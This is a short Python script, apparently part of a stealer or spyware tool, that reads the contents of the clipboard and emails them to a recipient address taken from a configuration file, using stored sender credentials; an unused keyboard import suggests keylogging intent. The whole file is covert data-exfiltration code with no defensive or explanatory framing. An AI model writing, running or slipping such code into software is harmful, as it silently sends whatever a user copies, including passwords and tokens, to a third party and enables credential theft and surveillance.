import utils 
import keyboard
import smtplib
import pyperclip
utils.email(utils.configReader("send"),utils.configReader("receive"),pyperclip.paste(),utils.configReader("password"))



            
